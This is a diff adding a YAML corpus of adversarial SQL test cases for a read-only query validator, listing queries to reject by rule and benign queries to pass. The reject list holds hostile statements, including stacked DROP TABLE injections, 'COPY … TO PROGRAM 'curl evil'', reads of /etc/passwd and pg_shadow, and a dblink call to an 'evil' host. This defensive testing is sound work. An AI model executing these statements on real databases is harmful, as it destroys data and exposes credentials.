@@ -1,0 +1,78 @@
+# Adversarial SQL corpus (docs/spec/TOOLS.md section 4.2). dialect: both | sqlite | postgres
+reject:
+  - {sql: "SELECT 1; DROP TABLE orders", rule: SR2}
+  - {sql: "SELECT 1;; SELECT 2", rule: SR2}
+  - {sql: "SELECT 1 /* ; */ ; DELETE FROM orders", rule: SR2}
+  - {sql: "SELECT 1; -- harmless\nUPDATE orders SET status='x'", rule: SR2}
+  - {sql: "DROP TABLE orders", rule: SR3}
+  - {sql: "DELETE FROM orders", rule: SR3}
+  - {sql: "UPDATE orders SET status = 'cancelled'", rule: SR3}
+  - {sql: "INSERT INTO orders (order_id) VALUES (1)", rule: SR3}
+  - {sql: "CREATE TABLE t AS SELECT * FROM orders", rule: SR3}
+  - {sql: "ALTER TABLE orders ADD COLUMN x INT", rule: SR3}
+  - {sql: "TRUNCATE orders", rule: SR3}
+  - {sql: "GRANT ALL ON orders TO public", rule: SR3}
+  - {sql: "BEGIN", rule: SR3}
+  - {sql: "COMMIT", rule: SR3}
+  - {sql: "PRAGMA writable_schema = 1", rule: SR3, dialect: sqlite}
+  - {sql: "ATTACH DATABASE '/tmp/x.db' AS x", rule: SR3, dialect: sqlite}
+  - {sql: "VACUUM", rule: SR3}
+  - {sql: "SET statement_timeout = 0", rule: SR3, dialect: postgres}
+  - {sql: "COPY orders TO PROGRAM 'curl evil'", rule: SR3, dialect: postgres}
+  - {sql: "WITH x AS (DELETE FROM orders RETURNING *) SELECT * FROM x", rule: SR4, dialect: postgres}
+  - {sql: "SELECT * INTO backup FROM orders", rule: SR4, dialect: postgres}
+  - {sql: "SELECT order_id FROM orders FOR UPDATE", rule: SR4, dialect: postgres}
+  - {sql: "SELECT pg_sleep(100)", rule: SR5, dialect: postgres}
+  - {sql: "SELECT pg_read_file('/etc/passwd')", rule: SR5, dialect: postgres}
+  - {sql: "SELECT * FROM dblink('host=evil', 'select 1') AS t(x int)", rule: SR5, dialect: postgres}
+  - {sql: "SELECT set_config('statement_timeout', '0', false)", rule: SR5, dialect: postgres}
+  - {sql: "SELECT current_setting('data_directory')", rule: SR5, dialect: postgres}
+  - {sql: "SELECT lo_import('/etc/passwd')", rule: SR5, dialect: postgres}
+  - {sql: "SELECT load_extension('evil.so')", rule: SR5, dialect: sqlite}
+  - {sql: "SELECT randomblob(1000000000)", rule: SR5, dialect: sqlite}
+  - {sql: "SELECT evil_udf(order_id) FROM orders", rule: SR5}
+  - {sql: "SELECT * FROM pg_catalog.pg_user", rule: SR7, dialect: postgres}
+  - {sql: "SELECT table_name FROM information_schema.tables", rule: SR7}
+  - {sql: "SELECT * FROM pg_shadow", rule: SR7, dialect: postgres}
+  - {sql: "SELECT sql FROM sqlite_master", rule: SR7, dialect: sqlite}
+  - {sql: "SELECT name FROM sqlite_schema", rule: SR7, dialect: sqlite}
+  - {sql: "SELECT * FROM secret_salaries", rule: SR6}
+  - {sql: "SELECT * FROM other_schema.orders", rule: SR6}
+  - {sql: "SELECT email FROM customers", rule: SR8}
+  - {sql: "SELECT * FROM customers", rule: SR8}
+  - {sql: "SELECT c.* FROM customers c", rule: SR8}
+  - {sql: "SELECT x FROM (SELECT phone AS x FROM customers) s", rule: SR8}
+  - {sql: "SELECT COUNT(*) FROM customers WHERE email LIKE '%@x.com'", rule: SR8}
+  - {sql: "SELECT o.order_id, c.EMAIL FROM orders o JOIN customers c ON o.customer_id = c.customer_id", rule: SR8}
+  - {sql: "SELECT no_such_column FROM orders", rule: SR9}
+  - {sql: "SELECT customer_id FROM orders JOIN customers ON orders.customer_id = customers.customer_id", rule: SR9}
+  - {sql: "SELECT * FROM orders WHERE order_id = ?", rule: SR11, dialect: sqlite}
+  - {sql: "SELECT * FROM orders WHERE order_id = $1", rule: SR11, dialect: postgres}
+  - {sql: "\\copy orders to '/tmp/x'", rule: SR11}
+  - {sql: "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r) SELECT n FROM r", rule: SR12}
+  - {sql: "SeLeCt 1; dRoP tAbLe orders", rule: SR2}
+  - {sql: "", rule: SR1}
+  - {sql: "SELEC order_id FROM orders", rule: SR1}
+pass:
+  - "SELECT order_id, status FROM orders WHERE status IN ('shipped', 'completed')"
+  - "SELECT 1"
+  - "SELECT COUNT(*) FROM customers"
+  - "SELECT customer_id, segment FROM customers WHERE is_test_account = 0"
+  - "SELECT o.order_id, SUM(oi.quantity * oi.unit_price) AS gross FROM orders o JOIN order_items oi ON oi.order_id = o.order_id GROUP BY o.order_id"
+  - "WITH t AS (SELECT customer_id, COUNT(*) AS n FROM orders GROUP BY customer_id) SELECT customer_id, n FROM t WHERE n > 2"
+  - "SELECT order_id, ROW_NUMBER() OVER (PARTITION BY customer_id ORDER BY order_date) AS rn FROM orders"
+  - "SELECT status FROM orders UNION ALL SELECT segment FROM customers"
+  - "SELECT CASE WHEN quantity > 1 THEN 'multi' ELSE 'single' END AS kind FROM order_items"
+  - "SELECT order_id FROM orders ORDER BY order_date DESC LIMIT 10"
+  - "SELECT UPPER(segment), LOWER(segment), LENGTH(segment) FROM customers"
+  - "SELECT COALESCE(ship_region_id, -1) FROM orders"
+  - "SELECT product_id, AVG(unit_price) FROM order_items GROUP BY product_id HAVING AVG(unit_price) > 10"
+  - "SELECT order_id FROM orders WHERE order_date >= '2025-10-01' AND order_date < '2026-01-01'"
+  - "SELECT * FROM orders"
+  - "SELECT o.* FROM orders o"
+  - "SELECT DISTINCT status FROM orders"
+  - "SELECT order_id FROM orders WHERE customer_id IN (SELECT customer_id FROM customers WHERE segment = 'enterprise')"
+  - "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 5) SELECT n FROM r LIMIT 5"
+  - "SELECT ROUND(SUM(quantity * unit_price), 2) AS revenue FROM order_items"
+  - "SELECT product_name FROM products WHERE description LIKE '%DROP TABLE%'"
+  - "SELECT c.customer_id, COUNT(o.order_id) FROM customers c LEFT JOIN orders o ON o.customer_id = c.customer_id GROUP BY c.customer_id"
